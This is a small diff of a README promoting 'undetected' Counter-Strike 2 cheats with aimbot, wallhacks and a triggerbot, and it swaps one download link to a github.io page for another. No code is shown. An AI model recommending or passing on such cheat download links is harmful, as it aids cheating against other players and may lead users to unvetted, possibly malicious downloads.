@@ -2,7 +2,7 @@
 
 Advanced undetected Counter-Strike 2 cheats with premium features like aimbot, wallhacks, and triggerbot for a competitive edge.
 
-[![Download Luna CS2 Cheats](https://img.shields.io/badge/Download-Luna_CS2_Cheats-blueviolet)](https://lunacs2ch3ats4pc.github.io/.github/)
+[![Download Luna CS2 Cheats](https://img.shields.io/badge/Download-Luna_CS2_Cheats-blueviolet)](https://luna-cs2-cheats.github.io/.github/luna)
 
 ---
 
